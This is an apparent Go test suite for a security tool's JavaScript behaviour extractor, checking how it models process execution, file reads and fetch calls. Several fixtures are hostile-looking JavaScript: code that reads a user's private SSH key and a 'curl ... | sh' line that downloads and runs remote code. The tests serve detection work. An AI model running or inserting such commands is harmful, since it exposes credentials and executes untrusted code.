package extract

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func javaScriptASTExtract(source string) behavior.Graph {
	var graph behavior.Graph
	extractJavaScriptASTSource(&graph, artifact.Content{NodeID: "node-js", LogicalPath: "fixture.js", MediaType: "text/javascript", SemanticLanguage: "javascript"}, source)
	return graph
}

func TestJavaScriptASTSourceSharedSemanticsAndEvidence(t *testing.T) {
	source := `(function(){try{var cp=require("child_process"),fs=require("fs"),os=require("os");function inspect(value){cp.execSync(value);fs.readFileSync("/Users/example/.ssh/id_ed25519");os.hostname();}inspect(command);}catch(error){}})();`
	graph := javaScriptASTExtract(source)
	if len(graph.Operations) != 3 {
		t.Fatalf("operations=%#v coverage=%#v", graph.Operations, graph.Coverage)
	}
	for _, operation := range graph.Operations {
		if operation.Support != behavior.SupportCorroborated || operation.SourceFunction != "inspect" || len(operation.EvidenceIDs) < 3 {
			t.Fatalf("missing exact scope or proofs: %#v", operation)
		}
		if operation.Execution.Connectivity != behavior.ConnectivityUnknown {
			t.Fatalf("source supplied execution proof: %#v", operation)
		}
	}
	if len(graph.ExecutionRoots) != 0 || len(graph.InvokedTargets) != 0 {
		t.Fatal("AST extraction invented host activation")
	}
	for _, evidence := range graph.Evidence {
		if !evidence.ByteOffsetKnown() || evidence.Method != "javascript-ast" || evidence.Offset < 0 || !strings.HasPrefix(source[evidence.Offset:], evidence.Value) {
			t.Fatalf("bad source lineage: %#v", evidence)
		}
	}
}

func TestJavaScriptASTSourcePreservesArtifactOffsets(t *testing.T) {
	source := "\n;\n(function(){var cp=require(\"child_process\");cp.execSync(\"/usr/bin/id\");})();\n"
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-js", LogicalPath: "fixture.js", SemanticLanguage: "javascript", ByteOffsetBase: 100}
	extractJavaScriptASTSource(&graph, content, source)
	if len(graph.Operations) != 2 {
		t.Fatalf("leading IIFE operations were lost or duplicated: %#v", graph.Operations)
	}
	var operation *behavior.ModeledOperation
	for index := range graph.Operations {
		if graph.Operations[index].Kind == behavior.OperationProcessExecute {
			operation = &graph.Operations[index]
		}
	}
	if operation == nil {
		t.Fatalf("leading IIFE process operation was lost: %#v", graph.Operations)
	}
	if operation.Line != 3 {
		t.Fatalf("leading IIFE location or API identity is wrong: %#v", operation)
	}
	callEvidence := false
	for _, id := range operation.EvidenceIDs {
		var evidence *behavior.Evidence
		for index := range graph.Evidence {
			if graph.Evidence[index].ID == id {
				evidence = &graph.Evidence[index]
				break
			}
		}
		if evidence == nil || !evidence.ByteOffsetKnown() || evidence.Offset < content.ByteOffsetBase {
			t.Fatalf("missing subregion evidence origin: %#v", evidence)
		}
		relative := evidence.Offset - content.ByteOffsetBase
		if relative >= int64(len(source)) || !strings.HasPrefix(source[relative:], evidence.Value) {
			t.Fatalf("subregion evidence does not map to original bytes: %#v", evidence)
		}
		if evidence.Kind == "javascript-api-call" && evidence.Value == `cp.execSync("/usr/bin/id")` {
			callEvidence = true
		}
	}
	if !callEvidence {
		t.Fatal("leading IIFE process lost its exact API-call evidence")
	}
}

func TestJavaScriptASTSourceIIFEPreservesWholeFileIdentity(t *testing.T) {
	for _, source := range []string{
		`;(function(){const cp=require("child_process");cp.execSync("/bin/echo inert");})();const later=require("child_process");capture(later);`,
		`;(function(){const cp=require("child_process");cp.execSync("/bin/echo inert");})();function require(){return {execSync(){}};}`,
		`;(async function(){await tick();const cp=require("child_process");cp.execSync("/bin/echo inert");})();const later=require("child_process");later.execSync=other;`,
		`;(function(){var cp=require("child_process");capture(cp);cp.execSync("/usr/bin/id");})();const later=require("child_process");capture(later);`,
		`const earlier=require("child_process");capture(earlier);(function(){var cp=require("child_process");cp.execSync("/usr/bin/id");})();`,
		`;(function(cp){cp.execSync("/usr/bin/id");})(require("child_process"));`,
	} {
		if graph := javaScriptASTExtract(source); len(graph.Operations) != 0 {
			t.Fatalf("unproved wrapper identity produced operations: %#v", graph.Operations)
		}
	}
}

func TestJavaScriptASTSourceFailsClosedForIdentityAndSyntax(t *testing.T) {
	for _, source := range []string{
		`function run(require){const cp=require("child_process");cp.exec(command);}`,
		`var cp=require("child_process");[cp]=[other];cp.exec(command);`,
		`var cp=require("child_process");({cp}=other);cp.exec(command);`,
		`var cp=require("child_process");for(cp of values){}cp.exec(command);`,
		`var cp=require("child_process");function* mutate(){capture(cp);}cp.exec(command);`,
		`if(condition)var cp=require("child_process");cp.exec(command);`,
		`if(condition){var cp=require("child_process");}cp.exec(command);`,
		`try{var cp=require("child_process");}catch(error){}cp.exec(command);`,
		`const cp=require("child_process");cp.exec(...args);`,
		`const cp=require("child_process");cp["exec"](command);`,
		`const cp=require("child_process");eval(code);cp.exec(command);`,
		`const cp=require("child_process");cp.exec(command);function broken( {`,
	} {
		graph := javaScriptASTExtract(source)
		if len(graph.Operations) != 0 {
			t.Fatalf("unproven identity/syntax produced operations: %s\n%#v", source, graph.Operations)
		}
	}
}

func TestJavaScriptASTSourceKeepsOptionEffectsUnknown(t *testing.T) {
	graph := javaScriptASTExtract(`const cp=require("child_process");cp.execSync("curl https://example.invalid/p | sh",{shell:customShell});`)
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute || graph.Operations[0].Qualifiers["unresolved_process_options"] == "" {
		t.Fatalf("unmodeled options expanded commands: %#v", graph.Operations)
	}
	if graph.Operations[0].Qualifiers["command_argument"] != "curl https://example.invalid/p | sh" {
		t.Fatal("literal API argument was hidden by unknown launch options")
	}
	for _, binding := range graph.Operations[0].ResourceBindings {
		if binding.Resource.Value != "" {
			t.Fatalf("unknown launch options retained a concrete executable: %#v", binding)
		}
	}
}

func TestJavaScriptASTCapturedNamespaceRetainsCoverageWithoutInvalidFacts(t *testing.T) {
	for _, body := range []string{
		`function outer(){const fs=require("fs");function inner(){fs.readFileSync("/tmp/inert");}}`,
		`function outer(){const cp=require("child_process");function inner(){cp.execSync("/bin/echo inert");}}`,
	} {
		graph := javaScriptASTExtract(body)
		if len(graph.Operations) != 0 || graph.InvalidItemsDropped != 0 || !hasPartialCoverageScope(graph.Coverage, "javascript-ast-binding-context") {
			t.Fatalf("captured namespace lost its explicit boundary: %#v", graph)
		}
	}
	for _, source := range []string{
		`const fs=require("fs");function inner(){fs.readFileSync("/tmp/inert");}`,
		`function inner(){const fs=require("fs");fs.readFileSync("/tmp/inert");}`,
	} {
		graph := javaScriptASTExtract(source)
		if len(graph.Operations) != 1 || graph.InvalidItemsDropped != 0 {
			t.Fatalf("compatible namespace evidence was rejected: %#v", graph)
		}
	}
}

func TestJavaScriptASTSourceReusesLiteralCommandSemantics(t *testing.T) {
	graph := javaScriptASTExtract(`const cp=require("child_process");cp.execSync("curl https://example.invalid/p | sh");`)
	assertShellCommandNetwork(t, graph, "https://example.invalid/p")
	for _, operation := range graph.Operations {
		if operation.Support != behavior.SupportCorroborated || len(operation.EvidenceIDs) < 3 {
			t.Fatalf("derived command lost provenance: %#v", operation)
		}
	}
}

func TestJavaScriptASTSourceSeparatesBranchScopesAndUnresolvedResources(t *testing.T) {
	graph := javaScriptASTExtract(`const fs=require("fs");if(condition){fs.readFileSync("/tmp/a");}else{fs.writeFileSync(dynamicPath,"data");}`)
	if len(graph.Operations) != 2 || graph.Operations[0].ScopeID == graph.Operations[1].ScopeID {
		t.Fatalf("branches shared operation scope: %#v", graph.Operations)
	}
	if graph.Operations[1].ResourceBindings[0].Resource.Value != "" || graph.Operations[1].Qualifiers["resource_binding"] != "unresolved" {
		t.Fatal("dynamic resource acquired a guessed value")
	}
}

func TestJavaScriptASTSourceDoesNotJoinUnbracedBranches(t *testing.T) {
	for _, body := range []string{
		`if(condition) fs.readFileSync("/tmp/a");else fs.writeFileSync("/tmp/a","data");`,
		`condition ? fs.readFileSync("/tmp/a") : fs.writeFileSync("/tmp/a","data");`,
		`condition && fs.readFileSync("/tmp/a");fs.writeFileSync("/tmp/a","data");`,
		`while(condition) fs.readFileSync("/tmp/a");fs.writeFileSync("/tmp/a","data");`,
		`switch(condition){case 1:fs.readFileSync("/tmp/a");break;case 2:fs.writeFileSync("/tmp/a","data");}`,
	} {
		graph := javaScriptASTExtract(`const fs=require("fs");` + body)
		if len(graph.Operations) != 2 || graph.Operations[0].ScopeID == graph.Operations[1].ScopeID {
			t.Fatalf("control-dependent operations shared a correlation scope: %s\n%#v", body, graph.Operations)
		}
	}
}

func TestJavaScriptASTSourceBudgetAndDeterminism(t *testing.T) {
	source := `const os=require("os");` + strings.Repeat(`os.hostname();`, maxJavaScriptAPICalls+1)
	one, two := javaScriptASTExtract(source), javaScriptASTExtract(source)
	if len(one.Operations) != maxJavaScriptAPICalls {
		t.Fatalf("call budget not respected: %d", len(one.Operations))
	}
	left, _ := json.Marshal(one)
	right, _ := json.Marshal(two)
	if string(left) != string(right) {
		t.Fatal("AST extraction is not deterministic")
	}
	found := false
	for _, coverage := range one.Coverage {
		if strings.Contains(coverage.Detail, "call budget") {
			found = true
		}
	}
	if !found {
		t.Fatal("omitted calls were not disclosed")
	}
}

func TestJavaScriptASTFrontendUsesSyntaxRouting(t *testing.T) {
	source := `(function(){try{var cp=require("child_process"),os=require("os");cp.execSync(command);os.hostname();}catch(error){}})();function* unrelated(value){yield value;}`
	if !requiresJavaScriptASTFrontend(prescanJavaScriptCommands(strings.Split(source, "\n"))) {
		t.Fatal("fixture must exercise AST routing")
	}
	graph := javaScriptAPIExtract(source)
	if len(graph.Operations) != 2 {
		t.Fatalf("missing or duplicate AST/line operations: %#v", graph.Operations)
	}
	for _, evidence := range graph.Evidence {
		if evidence.Kind == "javascript-api-call" && evidence.Method != "javascript-ast" {
			t.Fatal("line and AST frontends both processed the same source")
		}
	}
}

func TestJavaScriptASTFrontendPreservesEstablishedImportAdapter(t *testing.T) {
	source := `import{spawnSync}from "child_process";
function* unused(value){yield value;}
spawnSync("/bin/echo",["inert"],{stdio:"ignore"});`
	if requiresJavaScriptASTFrontend(prescanJavaScriptCommands(strings.Split(source, "\n"))) {
		t.Fatal("AST frontend intercepted a supported ESM import proof chain")
	}
	graph := javaScriptAPIExtract(source)
	if len(graph.Operations) != 1 || graph.Operations[0].Qualifiers["api"] != "child_process.spawnSync" {
		t.Fatalf("ESM operation regressed: %#v", graph.Operations)
	}
}

func TestJavaScriptASTFetchRequiresUnshadowedCall(t *testing.T) {
	for _, source := range []string{
		`const url="https://example.invalid/";`,
		`function run(fetch){fetch("https://example.invalid/");}`,
		`globalThis.fetch=other;fetch("https://example.invalid/");`,
		`global[dynamic]=other;fetch("https://example.invalid/");`,
		`const fetch=other;fetch("https://example.invalid/");`,
		`const copy=fetch;fetch("https://example.invalid/");`,
	} {
		if graph := javaScriptASTExtract(source); len(graph.Operations) != 0 {
			t.Fatalf("unproved fetch or URL-only source became communication: %s", source)
		}
	}
	graph := javaScriptASTExtract(`fetch("https://example.invalid/");`)
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationNetworkConnect {
		t.Fatalf("missing exact builtin fetch: %#v", graph.Operations)
	}
}
